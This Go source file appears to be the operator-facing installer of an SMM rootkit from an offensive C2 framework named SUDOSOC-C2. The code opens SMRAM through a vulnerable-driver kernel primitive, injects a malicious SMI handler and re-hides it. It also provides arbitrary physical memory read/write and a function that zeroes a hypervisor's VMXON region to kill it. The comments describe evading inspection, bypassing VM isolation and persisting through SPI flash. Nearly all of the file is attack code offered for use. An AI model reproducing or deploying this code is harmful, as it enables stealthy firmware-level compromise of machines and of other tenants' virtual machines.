package smm

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	SMM Rootkit — main orchestration.

	This is the operator-facing API. Call Install() to:
	  1. Detect SMRAM layout (TSEG base, size, lock state).
	  2. Allocate and pin the Ring3↔SMM communication buffer.
	  3. Open SMRAM (D_OPEN=1) using the BYOVD kernel primitive.
	  4. Save the original SMI handler prologue for chaining.
	  5. Inject the patched SmmHandlerStub at SMBASE+0x8000.
	  6. Re-close SMRAM (D_OPEN=0) — SMRAM is hidden again.
	  7. WBINVD — flush caches so all CPUs see the new handler.
	  8. Test: trigger our SMI and verify the handler responds.

	After Install() returns, the SMM rootkit is active:
	  - Every SMI is intercepted; legitimate SMIs are chained to the
	    original handler so the OS continues to function.
	  - The operator can issue READ_MEM / WRITE_MEM / EXEC_CODE commands
	    via the communication buffer to perform Ring -2 operations.

	Capabilities available to the SMM handler:
	  - Read/write ANY physical address including:
	      * SMRAM itself (normally invisible to Ring 0)
	      * MMIO regions (PCI BARs, APIC, firmware ROM)
	      * DMA buffers belonging to other VMs (bypasses EPT!)
	  - Execute arbitrary code at Ring -2 (SMM):
	      * No SMEP/SMAP restriction
	      * No CFG / CET enforcement
	      * Can disable hypervisor by modifying VMXON region in memory
	  - Survive indefinitely:
	      * SMRAM is re-locked after injection
	      * OS cannot inspect or modify SMRAM
	      * Survives reboots (SMRAM is battery-backed on some platforms)
	      * Only reset by: power off + SPI flash reflash (since the handler
	        was written to SMRAM, not SPI — it's lost on cold boot unless
	        combined with DRAGON-2 SPI injection to restore on every boot)

	Full persistence (Dragon Tier): combine DRAGON-2 (SPI flash) with
	DRAGON-3 (SMM handler). The SPI-injected DXE driver re-installs the
	SMM handler on every boot by calling SmmInstallProtocolInterface.
*/

import (
	"fmt"
	"runtime"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// SmmInstallConfig holds all parameters for the SMM rootkit installation.
type SmmInstallConfig struct {
	// KernelRW is the BYOVD kernel memory primitive (required).
	KernelRW KernelRW
	// CommBufferPhys overrides the default communication buffer physical address.
	// Set to 0 to auto-detect a free physical page.
	CommBufferPhysOverride uint64
}

// SmmInstallResult reports what was installed and how to use it.
type SmmInstallResult struct {
	SMBase          uint64
	TSEGBase        uint64
	TSEGSize        uint64
	HandlerAddr     uint64 // physical address where stub was written
	CommBufferPhys  uint64 // physical address of comm buffer
	CommBuffer      *SmmCommBuffer // Go pointer to comm buffer (valid until process exits)
	PingOK          bool
}

// Install performs the full SMM rootkit installation sequence.
func Install(cfg SmmInstallConfig) (*SmmInstallResult, error) {
	if cfg.KernelRW == nil {
		return nil, fmt.Errorf("KernelRW required — load BYOVD driver first")
	}

	// Step 1: Detect SMRAM.
	info, err := DetectSMRAM(cfg.KernelRW)
	if err != nil {
		return nil, fmt.Errorf("SMRAM detect: %w", err)
	}
	if info.IsLocked {
		return nil, fmt.Errorf("SMRAMC D_LCK is set — bypass required (see notes)")
	}
	// {{if .Config.Debug}}
	log.Printf("[smm] SMRAM: TSEG=0x%x size=0x%x SMBase=0x%x",
		info.TSEGBase, info.TSEGSize, info.SMBase)
	// {{end}}

	// Step 2: Allocate communication buffer.
	commBuf, err := AllocCommBuffer()
	if err != nil {
		return nil, fmt.Errorf("alloc comm buffer: %w", err)
	}
	commBufPhys, err := GetCommBufferPhysAddr(commBuf)
	if err != nil {
		return nil, fmt.Errorf("comm buffer PA: %w", err)
	}
	if cfg.CommBufferPhysOverride != 0 {
		commBufPhys = cfg.CommBufferPhysOverride
	}
	// {{if .Config.Debug}}
	log.Printf("[smm] comm buffer: VA=%p PA=0x%x", commBuf, commBufPhys)
	// {{end}}

	// Step 3: Pin to one CPU for the duration of the SMRAM surgery.
	// All logical CPUs share the same SMRAM on Intel (TSEG), but only CPU 0's
	// SMBASE+0x8000 is the "master" handler. We pin to CPU 0.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Step 4: Disable interrupts to prevent an SMI firing mid-surgery.
	cli()
	defer sti()

	// Step 5: Open SMRAM.
	origSMRAMC, err := OpenSMRAM(cfg.KernelRW, info)
	if err != nil {
		return nil, fmt.Errorf("open SMRAM: %w", err)
	}

	// Step 6: Save original handler prologue.
	handlerAddr := info.SMBase + 0x8000
	_, origPrologue, err := FindOriginalHandler(cfg.KernelRW, info.SMBase)
	if err != nil {
		_ = CloseSMRAM(cfg.KernelRW, origSMRAMC)
		return nil, fmt.Errorf("save original handler: %w", err)
	}

	// Copy original handler to SMBASE+0x8080 (our stub jumps there to chain).
	origHandlerCopyAddr := info.SMBase + 0x8080
	if err := WriteSMRAM(cfg.KernelRW, origHandlerCopyAddr, origPrologue); err != nil {
		_ = CloseSMRAM(cfg.KernelRW, origSMRAMC)
		return nil, fmt.Errorf("save original handler copy: %w", err)
	}

	// Step 7: Build and write the patched stub.
	stub := BuildPatchedHandler(commBufPhys, origHandlerCopyAddr)
	if err := WriteSMRAM(cfg.KernelRW, handlerAddr, stub); err != nil {
		// Try to restore the original before aborting.
		_ = WriteSMRAM(cfg.KernelRW, handlerAddr, origPrologue)
		_ = CloseSMRAM(cfg.KernelRW, origSMRAMC)
		return nil, fmt.Errorf("write SMM handler: %w", err)
	}
	// {{if .Config.Debug}}
	log.Printf("[smm] stub written at 0x%x (%d bytes)", handlerAddr, len(stub))
	// {{end}}

	// Step 8: Close SMRAM — re-hide it.
	if err := CloseSMRAM(cfg.KernelRW, origSMRAMC); err != nil {
		return nil, fmt.Errorf("close SMRAM: %w", err)
	}

	// Step 9: WBINVD — flush caches on all CPUs.
	wbinvdSMM()

	// Re-enable interrupts before testing (SMI trigger needs them unmasked).
	sti()
	cli() // will be undone by defer

	// Step 10: Verify — trigger our SMI and check response.
	pingOK := Ping(commBuf)
	// {{if .Config.Debug}}
	log.Printf("[smm] installation %s ping=%v", map[bool]string{true: "OK", false: "FAILED"}[pingOK], pingOK)
	// {{end}}

	return &SmmInstallResult{
		SMBase:         info.SMBase,
		TSEGBase:       info.TSEGBase,
		TSEGSize:       info.TSEGSize,
		HandlerAddr:    handlerAddr,
		CommBufferPhys: commBufPhys,
		CommBuffer:     commBuf,
		PingOK:         pingOK,
	}, nil
}

// ReadPhysical uses the installed SMM handler to read `length` bytes
// from arbitrary physical address `physAddr`. Works even on SMRAM.
func ReadPhysical(res *SmmInstallResult, physAddr uint64, length uint32) ([]byte, error) {
	if res.CommBuffer == nil {
		return nil, fmt.Errorf("SMM not installed")
	}
	return IssueReadMem(res.CommBuffer, physAddr, length)
}

// WritePhysical uses the SMM handler to write data to any physical address.
func WritePhysical(res *SmmInstallResult, physAddr uint64, data []byte) error {
	if res.CommBuffer == nil {
		return fmt.Errorf("SMM not installed")
	}
	return IssueWriteMem(res.CommBuffer, physAddr, data)
}

// DisableHypervisor uses the SMM handler to zero the VMXON region of the
// running hypervisor, crashing it and reverting the system to Ring 0 execution.
// This is the "hypervisor killer" capability — works against DRAGON-1 too.
func DisableHypervisor(res *SmmInstallResult, vmxonPhys uint64) error {
	// Zero the VMXON region (4K page). The CPU will exit VMX operation on
	// the next VMX instruction and cause a VMfailInvalid — the guest OS
	// resumes on bare metal without knowing the hypervisor died.
	zeros := make([]byte, 4096)
	return WritePhysical(res, vmxonPhys, zeros)
}
